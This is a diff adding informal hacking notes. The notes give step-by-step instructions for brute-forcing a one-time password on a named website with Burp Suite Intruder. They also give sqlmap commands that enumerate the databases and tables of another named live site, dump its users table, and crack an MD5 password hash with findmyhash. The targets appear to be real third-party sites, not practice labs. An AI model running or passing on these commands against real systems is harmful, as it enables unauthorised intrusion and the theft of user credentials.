@@ -1,0 +1,63 @@
+OTP brute forcing test website
+
+https://oneway.cab
+
+go to the website enter details and all till otp
+when entering OTP enter into proxy mode and the then turn burpsuite intercept on
+when getting request gent it to intruder select sniper attack
+set pay load as number enter details of attack then perform brute force on that the sequential attack with less string lenght is the right OTP
+
+
+
+SQL injection
+
+SQLMAP
+-u URL
+-d DATABASES -D
+-t TABLE     -T 
+
+--dbs database server Info 
+--table Info
+--random-agent
+--coulumn COLUMN info
+
+
+go to the website 
+http://www.meggieschneider.com
+under proxy mode
+spider the website 
+go to target 
+find the right id
+copy url and add ` to the end if this is interpreated as an invalid SQL command then this is the right website
+
+http://www.meggieschneider.com/php/detail.php?id=48
+
+SQL MAP code
+
+sqlmap -u http://www.meggieschneider.com/php/detail.php?id=48 --dbs --random-agent
+
+after the previous step we will get the DATABASES name
+
+the Type
+
+sqlmap -u http://www.meggieschneider.com/php/detail.php?id=48 --tables -D DB-name
+
+sqlmap -u http://www.meggieschneider.com/php/detail.php?id=48 --tables -D DB383432
+
+we will get the list  of all tables in the database  then out of them would select a table contaning user info columns Etc 
+
+sqlmap -u http://www.meggieschneider.com/php/detail.php?id=48 --column -D DATABASE -T TABLE
+
+sqlmap -u http://www.meggieschneider.com/php/detail.php?id=48 --column -D DB383432 -T users
+
+then we would dump the user 
+
+sqlmap -u http://www.meggieschneider.com/php/detail.php?id=48 --dump -D DATABASE -T TABLE
+
+sqlmap -u http://www.meggieschneider.com/php/detail.php?id=48 --dump -D DB383432 -T users
+
+after donig that u will get an user id and password in hash form crack the hash using of type MD5 using the code
+
+findmyhash md5 -h HASHVALUE
+
+findmyhash md5 -h  34857ee0ffba0f1a0f63b09ae823f891
